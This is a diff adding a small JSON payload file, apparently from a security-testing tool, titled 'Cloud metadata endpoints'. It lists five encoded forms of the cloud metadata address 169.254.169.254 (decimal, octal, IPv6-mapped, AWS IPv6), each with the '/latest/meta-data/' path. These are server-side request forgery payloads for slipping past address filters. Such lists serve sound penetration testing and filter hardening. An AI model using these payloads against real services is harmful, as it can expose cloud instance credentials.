@@ -1,0 +1,50 @@
+{
+    "name": "Cloud metadata endpoints",
+    "payloads": [
+        {
+            "payload": "2852039166",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Decimal IP of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "2c1973af9f940eafa8ebf98c195460465526c945"
+        },
+        {
+            "payload": "0251.0376.0251.0376",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Octal Representation of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "f5e91dbf51bd94979cbe25df8e9c3a533431a314"
+        },
+        {
+            "payload": "[::ffff:a9fe:a9fe]",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "IPv6 representation of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "7987043fa8fef388544d51ab4706b76e9c8f9467"
+        },
+        {
+            "payload": "[::ffff:169.254.169.254]",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "IPv4 inside IPv6 representation of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "b0efd8668d0d5d3841d8a5c2f257b481e59481d1"
+        },
+        {
+            "payload": "[fd00:ec2::254]",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "AWS EC2 IPv6 address https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "ac92c17d4e064ceb35f590d7b7d48f0ec71f213b"
+        }
+    ]
+}
